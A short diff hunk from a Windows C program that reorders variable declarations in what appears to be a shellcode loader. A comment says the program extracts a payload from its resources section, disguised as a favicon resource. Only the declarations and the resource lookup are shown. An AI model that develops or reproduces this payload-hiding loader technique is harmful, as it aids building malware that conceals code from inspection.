@@ -8,9 +8,9 @@ int main(void)
 {
     void* exec_mem;
     BOOL rv;
-    HANDLE th;
-    DWORD old_protect = 0;
     HRSRC res;
+    HANDLE th;
+    DWORD old_protect;
 
     // Extract payload from resources section
     res = FindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
